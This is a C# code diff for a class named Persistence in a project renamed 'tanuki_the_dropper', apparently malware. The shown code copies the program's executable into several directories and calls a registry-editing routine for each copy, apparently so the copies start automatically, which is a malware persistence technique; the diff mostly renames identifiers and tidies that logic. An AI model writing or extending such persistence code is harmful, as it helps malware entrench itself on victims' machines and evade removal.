@@ -1,12 +1,8 @@
 ﻿using Microsoft.Win32;
 using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
-namespace tanuki_the_first
+namespace tanuki_the_dropper
 {
     public class Persistence
     {
@@ -22,7 +18,7 @@ namespace tanuki_the_first
             int i = 0;
             foreach (string path in path_copies)
             {
-                string copy = Path.Combine(path, "taniki_the_first" + i.ToString() + ".exe");
+                string copy = Path.Combine(path, "tanuki_the_dropper" + i.ToString() + ".exe");
 
                 if (Directory.Exists(path))
                 {
@@ -47,7 +43,8 @@ namespace tanuki_the_first
                             Console.WriteLine("Failed to copy: " + ex.Message);
                         }
                     }
-                    this.EditRegister(copy);
+                    
+                    EditRegister(copy);
                     i++;
                 }
             }
@@ -55,7 +52,7 @@ namespace tanuki_the_first
 
         private void EditRegister(string filePath)
         {
-            string keyName = filePath.Split('\\').Last().Split('.')[0];
+            string keyName = Path.GetFileNameWithoutExtension(filePath);
             string value = filePath;
 
             try
